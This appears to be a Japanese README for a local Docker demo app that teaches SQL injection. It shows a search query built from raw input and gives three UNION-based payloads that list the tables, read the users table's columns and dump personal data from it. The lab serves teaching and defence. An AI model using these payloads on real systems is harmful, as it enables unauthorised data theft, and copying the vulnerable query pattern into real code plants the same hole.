# SQLインジェクションサンプル

SQLインジェクションを実感できるサンプル

## requirements
- docker
- docker compose

## installation
```sh
docker compose up -d
```

上記コマンドでサーバを立ち上げることで、 http://localhost:8000 にアクセスするとページが表示されます。

## インジェクション体験
### ページ概要

<img width="389" alt="image" src="https://user-images.githubusercontent.com/9111423/137260754-59f4a5b7-40b9-447a-851d-09dc042703a6.png">

このサンプルページは、製品を一覧表示するページです。  
このページでは、以下のSQLが実行されています。

```sql
SELECT * FROM products
```

また、製品名をフォームで送信することで、以下のSQLにより検索結果の絞り込みができます。 `{name}` には入力した値が入ります。

```sql
SELECT * FROM products WHERE name LIKE '%{name}%'
```

### テーブルの一覧を取得する
フォームに以下の値を入力することで、テーブルの一覧を取得できます。

```
' UNION SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = DATABASE() -- 
```

実行すると以下のような結果になります。

<img width="398" alt="image" src="https://user-images.githubusercontent.com/9111423/137260878-b6fed6c1-0ae8-4f3e-9d69-98afa49ce556.png">


使用しているデータベース名(test)と、テーブル名のリスト(products, users)が表示されました。  
よって、このデータベースでは `users` というテーブルがあることが確認できました。

このとき、実行されたSQLはこのようになります。

```sql
SELECT * FROM products WHERE name LIKE '%'
UNION
SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = DATABASE()
-- %'
```

### users テーブルの構造を取得する
同様の方法で、 users テーブルの構造を取得できます。

```
' UNION SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users' AND TABLE_SCHEMA = 'test' -- 
```

<img width="370" alt="image" src="https://user-images.githubusercontent.com/9111423/137260994-02888285-6a6e-4693-a49d-e91d2aa5876e.png">

`users` テーブルにあるカラムがわかりました。

このとき、実行されたSQLはこのようになります。

```sql
SELECT * FROM products WHERE name LIKE '%'
UNION
SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users' AND TABLE_SCHEMA = 'test'
-- %'
```

### users テーブルの情報を取得する
テーブル名とテーブルの構造がすでに把握できたので、簡単に `users` テーブルの中身を表示できます。

```
' UNION SELECT name, department FROM users -- 
```

<img width="364" alt="image" src="https://user-images.githubusercontent.com/9111423/137261111-9277aa95-1c4b-4f03-85cc-2d7b4ddc2718.png">

個人情報を取得することができました。

このとき、実行されたSQLはこのようになります。

```sql
SELECT * FROM products WHERE name LIKE '%'
UNION
SELECT name, department FROM users
-- %'
```
